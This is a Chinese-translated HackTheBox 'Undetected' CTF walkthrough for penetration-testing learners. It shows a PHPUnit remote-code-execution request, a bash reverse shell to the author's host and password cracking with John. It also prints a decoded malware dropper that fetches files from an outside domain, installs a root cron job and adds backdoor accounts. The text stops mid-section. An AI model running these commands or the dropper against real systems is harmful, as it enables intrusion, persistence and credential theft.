<html>
<head>
<title>Undetected from HackTheBox — Detailed Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">未被黑客盒子检测到—详细演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/undetected-from-hackthebox-detailed-walkthrough-82847eadf7a7?source=collection_archive---------1-----------------------#2022-07-02">https://infosecwriteups.com/undetected-from-hackthebox-detailed-walkthrough-82847eadf7a7?source=collection_archive---------1-----------------------#2022-07-02</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="31a1" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">向您展示完成盒子所需的所有工具和技术。</h2></div><h1 id="23ef" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">机器信息</h1><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi kx"><img src="../Images/3e7f602d4abb09ea46d6154cc5af4684.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/0*e9_SZwobggetPZBX.png"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">未被黑客盒子发现</figcaption></figure><p id="6e41" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated"><a class="ae mf" href="https://app.hackthebox.com/machines/439" rel="noopener ugc nofollow" target="_blank"> Undetected </a>是HackTheBox上的一台中等级别的Linux机器，由<a class="ae mf" href="https://app.hackthebox.com/users/114053" rel="noopener ugc nofollow" target="_blank"> TheCyberGeek </a>创建。我们首先找到一个带有phpunit漏洞版本的网站。我们利用这一点来执行远程命令，并获得一个反向外壳。在服务器上发现了一个包含十六进制编码哈希的文件，它被破解后给了我们一个用户密码。从那里我们找到一个隐藏的共享库文件，我们使用Ghidra逆向找到一个base64编码的字符串。这让我们想到了sshd的一个修改版本，当使用Ghidra进行反向操作时，就会发现增加了一个后门。解码后，我们终于有了根密码，并完成了盒子。</p><p id="6968" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">所需的技能是基本的网络和操作系统枚举，以及研究利用。学到的技能是使用Ghidra逆向工程文件和搜索漏洞。</p><div class="mg mh gp gr mi mj"><a href="https://www.hackthebox.com/home/machines/profile/439" rel="noopener  ugc nofollow" target="_blank"><div class="mk ab fo"><div class="ml ab mm cl cj mn"><h2 class="bd ir gy z fp mo fr fs mp fu fw ip bi translated">未被检测到—破解机箱::渗透测试实验室</h2><div class="mq l"><h3 class="bd b gy z fp mo fr fs mp fu fw dk translated">登录Hack The Box平台，让您的笔测试和网络安全技能更上一层楼！</h3></div><div class="mr l"><p class="bd b dl z fp mo fr fs mp fu fw dk translated">www.hackthebox.com</p></div></div><div class="ms l"><div class="mt l mu mv mw ms mx ld mj"/></div></div></a></div><h1 id="0815" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">初步侦察</h1><p id="266a" class="pw-post-body-paragraph lj lk iq ll b lm my jr lo lp mz ju lr ls na lu lv lw nb ly lz ma nc mc md me ij bi translated">像往常一样，让我们从Nmap开始:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi nd"><img src="../Images/3db5342a7db242145aa2c618e2f79930.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*i-n8moba7xdGMqimuTP7VQ.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">盒子的Nmap扫描</figcaption></figure><h1 id="291a" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">网站(全球资讯网的主机站)</h1><p id="6d01" class="pw-post-body-paragraph lj lk iq ll b lm my jr lo lp mz ju lr ls na lu lv lw nb ly lz ma nc mc md me ij bi translated">从响应中我们看到戴安娜的珠宝在端口80上:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi ni"><img src="../Images/255f3db3866ed0f6282d1aef26c68e5b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*eFG-x8gcj7ljmJ2K.png"/></div></div></figure><p id="bb4b" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">除了store按钮显示了一个子域外，网站上没有什么，让我们添加到我们的hosts文件中:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="e6b0" class="no kg iq nk b gy np nq l nr ns">┌──(root💀kali)-[~/htb]<br/>└─# echo "10.10.11.146 djewelry.htb store.djewelry.htb" &gt;&gt; /etc/hosts</span></pre><p id="0a83" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">逛商店看不出任何明显的东西:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi nt"><img src="../Images/cc66d5c5241e3b093c6be3f8b4fac17f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*_RtxxEhpqbdGEUW2.png"/></div></div></figure><h1 id="5df6" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">Gobuster</h1><p id="5492" class="pw-post-body-paragraph lj lk iq ll b lm my jr lo lp mz ju lr ls na lu lv lw nb ly lz ma nc mc md me ij bi translated">接下来用gobuster查找文件夹:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi nu"><img src="../Images/9fff3861bcd6879725edcf18d31329fb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*N17VOO6KcfSDS4_uDc7_LQ.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">Gobuster扫描子目录</figcaption></figure><h1 id="34c9" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">CVE-2017–9041</h1><p id="bf15" class="pw-post-body-paragraph lj lk iq ll b lm my jr lo lp mz ju lr ls na lu lv lw nb ly lz ma nc mc md me ij bi translated">供应商文件夹可疑。为什么可以在网络服务器上访问？浏览它，我们看到一些子文件夹，并搜索“利用供应商文件夹”找到了<a class="ae mf" href="https://blog.ovhcloud.com/cve-2017-9841-what-is-it-and-how-do-we-protect-our-customers/" rel="noopener ugc nofollow" target="_blank">这个</a>，这解释了它如何容易受到CVE-2017–9841的攻击。更多信息<a class="ae mf" href="https://nvd.nist.gov/vuln/detail/CVE-2017-9841" rel="noopener ugc nofollow" target="_blank">这里</a>和<a class="ae mf" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9841" rel="noopener ugc nofollow" target="_blank">这里</a>给了我们一个尝试和利用它的方法。</p><p id="f3f8" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">首先我发现<a class="ae mf" href="https://github.com/RandomRobbieBF/phpunit-brute" rel="noopener ugc nofollow" target="_blank">这个</a>暴力脚本，我用它来确认这里的phpunit版本易受攻击:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi nv"><img src="../Images/e8e0d160c1cc394912f6d783aae7c6ac.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*khlvKzsk8fv5s9Ja-3e_5g.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">wget phpunit漏洞</figcaption></figure><p id="5451" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">该脚本确认这是我们的前进道路，phpunit是可利用的。例子<a class="ae mf" href="https://gist.github.com/AssassinUKG/9f150ee3da9d9a9e421635876859a26d" rel="noopener ugc nofollow" target="_blank">这里</a>和<a class="ae mf" href="http://web.archive.org/web/20170701212357/http://phpunit.vulnbusters.com/" rel="noopener ugc nofollow" target="_blank">这里</a>向我展示了如何尝试:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="2a61" class="no kg iq nk b gy np nq l nr ns">curl --data "&lt;?php echo(pi());" http://localhost:8888/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</span></pre><p id="69f7" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">当我测试这个盒子时，它工作了:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="94ba" class="no kg iq nk b gy np nq l nr ns">┌──(root💀kali)-[~/htb/undetected]<br/>└─# curl --data "&lt;?php echo(pi());" http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php<br/>3.1415926535898</span></pre><p id="fead" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">在列举了一些之后，我尝试了一个反向shell:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="b8b7" class="no kg iq nk b gy np nq l nr ns">┌──(root💀kali)-[~/htb/undetected]<br/>└─# curl --data "&lt;?php system('/bin/bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.14/1337 0&gt;&amp;1\"');" http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php</span></pre><h1 id="2bcc" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">反向外壳</h1><p id="fe8b" class="pw-post-body-paragraph lj lk iq ll b lm my jr lo lp mz ju lr ls na lu lv lw nb ly lz ma nc mc md me ij bi translated">这奏效了，我等待的nc监听器捕获到了shell:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="c3c7" class="no kg iq nk b gy np nq l nr ns">┌──(root💀kali)-[~]<br/>└─# nc -nlvp 1337<br/>listening on [any] 1337 ...<br/>connect to [10.10.14.14] from (UNKNOWN) [10.10.11.146] 57118<br/>www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$</span></pre><p id="60f4" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">我的身份是www-data:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="dc4d" class="no kg iq nk b gy np nq l nr ns">www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ id<br/>id<br/>uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></pre><h1 id="3915" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">信息文件</h1><p id="857a" class="pw-post-body-paragraph lj lk iq ll b lm my jr lo lp mz ju lr ls na lu lv lw nb ly lz ma nc mc md me ij bi translated">在对文件系统进行了一些枚举之后，我发现了www-data拥有的一些有趣的东西:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="3e81" class="no kg iq nk b gy np nq l nr ns">www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ find / -user www-data -not -path "/proc/*" -not -path "/var/www/*" 2&gt; /dev/null<br/>&lt;path "/proc/*" -not -path "/var/www/*" 2&gt; /dev/null<br/>/tmp/tmux-33<br/>/dev/pts/0<br/>/var/cache/apache2/mod_cache_disk<br/>/var/backups/info<br/>/run/lock/apache2</span></pre><p id="e50f" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">备份文件夹中的这个信息文件是什么？让我们来看看:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="3a4a" class="no kg iq nk b gy np nq l nr ns">www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ cp /var/backups/info /tmp<br/>www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ cd /tmp<br/><br/>www-data@production:/tmp$ file info<br/>file info<br/>info: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0dc004db7476356e9ed477835e583c68f1d2493a, for GNU/Linux 3.2.0, not stripped<br/><br/>www-data@production:/tmp$ ./info<br/>[-] substring 'ffff' not found in dmesg<br/>[.] starting<br/>[.] namespace sandbox set up<br/>[.] KASLR bypass enabled, getting kernel addr</span></pre><p id="08de" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">不确定它是做什么的，把它拉过来给Kali，这样我们可以看得更远一点:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi nw"><img src="../Images/823ebba740710c9e44a8b96bd7310d18.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Zqxx9UFtsZxK5Pwuoav1JA.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">从盒子里取出信息文件</figcaption></figure><h1 id="dfd0" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">使用字符串查看文件</h1><p id="dd5f" class="pw-post-body-paragraph lj lk iq ll b lm my jr lo lp mz ju lr ls na lu lv lw nb ly lz ma nc mc md me ij bi translated">首先在二进制文件上尝试字符串，看看明文中有什么:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="616c" class="no kg iq nk b gy np nq l nr ns">┌──(root💀kali)-[~/htb/undetected]<br/>└─# strings info<br/>/lib64/ld-linux-x86-64.so.2<br/>&lt;SNIP&gt;<br/>[-] setsockopt(PACKET_VERSION)<br/>[-] setsockopt(PACKET_RX_RING)<br/>[-] socket(AF_PACKET)<br/>[-] bind(AF_PACKET)<br/>[-] sendto(SOCK_RAW)<br/>[-] socket(SOCK_RAW)<br/>[-] socket(SOCK_DGRAM)<br/>[-] klogctl(SYSLOG_ACTION_SIZE_BUFFER)<br/>[-] klogctl(SYSLOG_ACTION_READ_ALL)<br/>Freeing SMP<br/>[-] substring '%s' not found in dmesg<br/>/bin/bash<br/>56d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f2&lt;SNIP&gt;<br/>03a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737&lt;SNIP&gt;<br/>646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b&lt;SNIP&gt;<br/>[-] fork()<br/>/etc/shadow<br/>[.] checking if we got root<br/>[-] something went wrong =(</span></pre><h1 id="8c06" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">用XXD解码</h1><p id="46cd" class="pw-post-body-paragraph lj lk iq ll b lm my jr lo lp mz ju lr ls na lu lv lw nb ly lz ma nc mc md me ij bi translated">这是一个冗长的输出，但有一个明显的十六进制字符串，我用xxd解码:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="7d75" class="no kg iq nk b gy np nq l nr ns">┌──(root💀kali)-[~/htb/undetected]<br/>└─# echo 776765742074656d&lt;SNIP&gt;572732e7478743b | xxd -r -p | sed 's/;/\n/g'<br/>wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys<br/>wget tempfiles.xyz/.main -O /var/lib/.main<br/>chmod 755 /var/lib/.main<br/>echo "* 3 * * * root /var/lib/.main" &gt;&gt; /etc/crontab<br/>awk -F":" '$7 == "/bin/bash" &amp;&amp; $3 &gt;= 1000 {system("echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: &gt;&gt; /etc/shadow")}' /etc/passwd<br/>awk -F":" '$7 == "/bin/bash" &amp;&amp; $3 &gt;= 1000 {system("echo "$1" "$3" "$6" "$7" &gt; users.txt")}' /etc/passwd<br/>while read -r user group home shell _<br/>do echo "$user"1":x:$group:$group:,,,:$home:$shell" &gt;&gt; /etc/passwd<br/>done &lt; users.txt<br/>rm users.txt</span></pre><h1 id="a732" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">与JohnTheRipper一起破解</h1><p id="7b24" class="pw-post-body-paragraph lj lk iq ll b lm my jr lo lp mz ju lr ls na lu lv lw nb ly lz ma nc mc md me ij bi translated">我们看到这是一个脚本，它复制文件，设置cronjob，添加用户和密码，然后整理。我们可以从这行代码中取出密码的散列，用JohnTheRipper破解它:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="4668" class="no kg iq nk b gy np nq l nr ns">echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: &gt;&gt; /etc/shadow</span></pre><p id="ee4e" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">我们需要passwd文件来查看散列是针对哪个用户的:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="8b4a" class="no kg iq nk b gy np nq l nr ns">┌──(root💀kali)-[~/htb/undetected]<br/>└─# curl --data "&lt;?php system('cat /etc/passwd');" http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php<br/>root:x:0:0:root:/root:/bin/bash<br/>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br/>&lt;SNIP&gt;<br/>steven:x:1000:1000:Steven Wright:/home/steven:/bin/bash<br/>lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false<br/>sshd:x:112:65534::/run/sshd:/usr/sbin/nologin<br/>steven1:x:1000:1000:,,,:/home/steven:/bin/bash</span></pre><p id="4cb1" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">我们有两个steven帐户，看上面的回显，它添加了一个1，所以我们知道我们正在破解的帐户是steven1。将该行放入文件中:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="73c4" class="no kg iq nk b gy np nq l nr ns">┌──(root💀kali)-[~/htb/undetected]<br/>└─# echo "steven1:x:1000:1000:,,,:/home/steven:/bin/bash" &gt; steven1.passwd</span></pre><p id="af99" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">现在将密码的散列放在一个文件中:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="edaa" class="no kg iq nk b gy np nq l nr ns">┌──(root💀kali)-[~/htb/undetected]<br/>└─# echo "steven1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7:::" &gt; steven1.shadow</span></pre><p id="a64f" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">现在使用unshadow为John创建文件:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="1e90" class="no kg iq nk b gy np nq l nr ns">┌──(root💀kali)-[~/htb/undetected]<br/>└─# unshadow steven1.passwd steven1.shadow &gt; steven1.hash</span></pre><p id="9dbd" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">然后让约翰和洛克一起去:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="2887" class="no kg iq nk b gy np nq l nr ns">┌──(root💀kali)-[~/htb/undetected]<br/>└─# john --wordlist=/usr/share/wordlists/rockyou.txt steven1.hash<br/>Using default input encoding: UTF-8<br/>Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])<br/>Cost 1 (iteration count) is 5000 for all loaded hashes<br/>Will run 4 OpenMP threads<br/>Press 'q' or Ctrl-C to abort, almost any other key for status<br/>ihatehackers     (steven1)<br/>1g 0:00:01:44 DONE (2022-02-20 22:47) 0.009611g/s 856.2p/s 856.2c/s 856.2C/s littlebrat..halo03<br/>Use the "--show" option to display all of the cracked passwords reliably<br/>Session completed.</span></pre><h1 id="a161" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">用户标志</h1><p id="1702" class="pw-post-body-paragraph lj lk iq ll b lm my jr lo lp mz ju lr ls na lu lv lw nb ly lz ma nc mc md me ij bi translated">我们很快得到密码，可以将用户切换到steven1:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="d324" class="no kg iq nk b gy np nq l nr ns">www-data@production:/tmp$ su steven1<br/>Password: ihatehackers<br/>id<br/>uid=1000(steven) gid=1000(steven) groups=1000(steven)</span></pre><p id="becb" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">让我们获取用户标志:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="8e41" class="no kg iq nk b gy np nq l nr ns">steven@production:/root$ cat /home/steven/user.txt <br/>2c2027e7412139c4cb59d97c6411ba99</span></pre><p id="06ff" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">环顾四周，我注意到的第一件事是史蒂文有一封电子邮件:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="dac7" class="no kg iq nk b gy np nq l nr ns">cat /var/mail/steven<br/>From root@production  Sun, 25 Jul 2021 10:31:12 GMT<br/>Return-Path: &lt;root@production&gt;<br/>Received: from production (localhost [127.0.0.1])<br/>        by production (8.15.2/8.15.2/Debian-18) <br/>        for &lt;steven@production&gt;; Sun, 25 Jul 2021 10:31:12 GMT<br/>        by production (8.15.2/8.15.2/Submit) id 80FAcdZ171847;<br/>        Sun, 25 Jul 2021 10:31:12 GMT<br/>Date: Sun, 25 Jul 2021 10:31:12 GMT<br/>Message-Id: &lt;202107251031.80FAcdZ171847@production&gt;<br/>To: steven@production<br/>From: root@production<br/>Subject: Investigations<br/><br/>Hi Steven.<br/><br/>We recently updated the system but are still experiencing some strange behaviour with the Apache service. We have temporarily moved the web store and database to another server whilst investigations are underway. If for any reason you need access to the database or web application code, get in touch with Mark and he will generate a temporary password for you to authenticate to the temporary server.<br/><br/>Thanks,<br/>sysadmin</span></pre><h1 id="b10a" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">可疑的Apache模块</h1><p id="b1e4" class="pw-post-body-paragraph lj lk iq ll b lm my jr lo lp mz ju lr ls na lu lv lw nb ly lz ma nc mc md me ij bi translated">这里有一个关于行为不端的Apache服务的线索。在模块文件夹中，我注意到这个看起来很奇怪:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi nx"><img src="../Images/99c99c5a6c311b458d2b004c1e32d2c6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YTifoJEfVc-KQ0DskKeF0w.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">安装的apache模块列表</figcaption></figure><p id="6b6f" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">一个时间戳与其他文件不同的mod文件。检查<a class="ae mf" href="https://packages.debian.org/sid/amd64/apache2-bin/filelist" rel="noopener ugc nofollow" target="_blank"> Debian软件包文件列表</a>我可以看到该文件不是标准发行版的一部分:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="4de0" class="no kg iq nk b gy np nq l nr ns">/usr/lib/apache2/modules/mod_ratelimit.so<br/>/usr/lib/apache2/modules/mod_reflector.so<br/>/usr/lib/apache2/modules/mod_remoteip.so<br/>/usr/lib/apache2/modules/mod_reqtimeout.so<br/>/usr/lib/apache2/modules/mod_request.so<br/>/usr/lib/apache2/modules/mod_rewrite.so</span></pre><p id="b59c" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">所以mod_reader.so值得一看，我们把它拉到Kali:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="3946" class="no kg iq nk b gy np nq l nr ns">┌──(root💀kali)-[~/htb/undetected]<br/>└─# curl --data "&lt;?php system('cat /usr/lib/apache2/modules/mod_reader.so');" http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php --output mod_reader.so</span></pre><h1 id="eb0f" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">与Ghidra一起倒车</h1><p id="6e85" class="pw-post-body-paragraph lj lk iq ll b lm my jr lo lp mz ju lr ls na lu lv lw nb ly lz ma nc mc md me ij bi translated">是时候启动Ghidra并在文件中探索一下了。如果你不确定如何使用Ghidra，这里的是一个有用的帖子。</p><p id="ffbf" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">我还没有把它安装在这台虚拟机上，但在添加之前，请注意这需要大约800mb的空间来安装:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="73dc" class="no kg iq nk b gy np nq l nr ns">┌──(root💀kali)-[~/htb/undetected]<br/>└─# apt install ghidra        <br/>Reading package lists... Done<br/>Building dependency tree... Done<br/>Reading state information... Done<br/>The following additional packages will be installed:<br/>  ghidra-data openjdk-11-jdk-headless openjdk-11-jre openjdk-11-jre-headless<br/>The following NEW packages will be installed:<br/>  ghidra ghidra-data openjdk-11-jdk-headless<br/>The following packages will be upgraded:<br/>  openjdk-11-jre openjdk-11-jre-headless<br/>2 upgraded, 3 newly installed, 0 to remove and 587 not upgraded.<br/>Need to get 613 MB of archives.<br/>After this operation, 1,282 MB of additional disk space will be used.<br/>Do you want to continue? [Y/n] y<br/>Get:1 https://http.kali.org/kali kali-rolling/main amd64 openjdk-11-jre amd64 11.0.14+9-1 [175 kB]<br/>Get:2 https://http.kali.org/kali kali-rolling/main amd64 openjdk-11-jre-headless amd64 11.0.14+9-1 [37.3 MB]<br/>Get:3 https://http.kali.org/kali kali-rolling/main amd64 openjdk-11-jdk-headless amd64 11.0.14+9-1 [214 MB]<br/>Get:4 https://archive-4.kali.org/kali kali-rolling/main amd64 ghidra amd64 10.1.2-0kali2 [282 MB]<br/>Get:5 https://archive-4.kali.org/kali kali-rolling/main amd64 ghidra-data all 9.2-0kali2 [79.1 MB]<br/>Fetched 613 MB in 15min 39s (653 kB/s)<br/>(Reading database ... 300882 files and directories currently installed.)<br/>Preparing to unpack .../openjdk-11-jre_11.0.14+9-1_amd64.deb ...<br/>&lt;SNIP&gt;<br/>Setting up ghidra-data (9.2-0kali2) ...<br/>Setting up ghidra (10.1.2-0kali2) ...<br/>Processing triggers for kali-menu (2021.4.2) ...<br/>Processing triggers for desktop-file-utils (0.26-1) ...<br/>Processing triggers for hicolor-icon-theme (0.17-2) ...<br/>Processing triggers for mailcap (3.70+nmu1) ...</span></pre><p id="1e45" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">安装完成后，只需在控制台中键入ghidra即可启动GUI。创建一个新项目并导入mod_reader.so文件:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi ny"><img src="../Images/ec7760db8e25ec6323d54496bb516bf8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*8B9W_ebVDF4nyzg5.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">用Ghidra看mod_reader.so</figcaption></figure><p id="1d06" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">环顾四周，我发现了一个名为hook_post_config的函数，它包含一些base64:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi nz"><img src="../Images/0a54e3237b12b9b1246bec0304c31c21.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*2mtgJE28iJ57z8Fl.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">使用Ghidra查看host_post_config</figcaption></figure><h1 id="1a71" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">Base64解码</h1><p id="64b4" class="pw-post-body-paragraph lj lk iq ll b lm my jr lo lp mz ju lr ls na lu lv lw nb ly lz ma nc mc md me ij bi translated">复制并解码后我们发现了一些有趣的东西:</p><pre class="ky kz la lb gt nj nk nl nm aw nn bi"><span id="e50d" class="no kg iq nk b gy np nq l nr 